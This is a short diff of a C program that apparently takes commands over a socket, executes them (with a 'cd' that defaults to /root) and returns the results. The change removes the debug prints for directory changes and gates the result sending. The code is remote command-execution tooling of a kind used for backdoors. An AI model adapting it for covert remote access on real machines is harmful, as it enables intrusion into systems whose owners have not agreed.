@@ -60,7 +60,9 @@ int main(int argc,char* argv[])
                 break;
             } else if(strncmp(buf, "exec", 4) == 0){
                 execcmd(buf + 4);
-                sendresult(sock_fd, buf);
+                if(rv > 0){
+                    sendresult(sock_fd, buf);
+                }
             }
         }
     }
@@ -111,10 +113,8 @@ int execcmd(char* cmd){
     }
     if(strcmp(args[0],"cd")==0){
         if(args[1] == NULL || strcmp(args[1],"~")==0 || strcmp(args[1],"")==0){
-            printf("Change to root\n");
             rv = chdir("/root");
         } else {
-            printf("Change to [%s]\n", args[1]);
             rv = chdir(args[1]);
         }
     } else {
